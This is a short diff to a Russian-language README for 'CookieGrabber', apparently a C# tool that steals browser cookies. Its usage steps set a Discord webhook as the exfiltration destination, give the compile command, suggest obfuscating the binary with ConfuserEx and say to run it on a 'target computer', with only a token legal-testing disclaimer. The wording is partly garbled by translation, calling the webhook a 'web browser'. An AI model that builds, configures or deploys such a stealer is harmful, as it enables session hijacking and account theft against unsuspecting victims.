@@ -48,7 +48,7 @@ csc /target:winexe /platform:x64 /optimize+ /out:CookieGrabber.exe /r:System.Net
 
 ### Usage
 
-1. Измените константу **WebhookUrl** в CookieGrabber.cs на свой собственный веб-браузер Discord.
+1. Измените константу `**WebhookUrl**` в CookieGrabber.cs на свой собственный веб-браузер Discord.
 2. Скомпилируйте с помощью приведенной выше команды (Visual Studio или standalone csc).
 3. (Необязательно) Выполните обфускацию с помощью ConfuserEx, используя "protection.crproj".
 4. Запустите `CookieGrabber.exe" на целевом компьютере (только для законного тестирования).
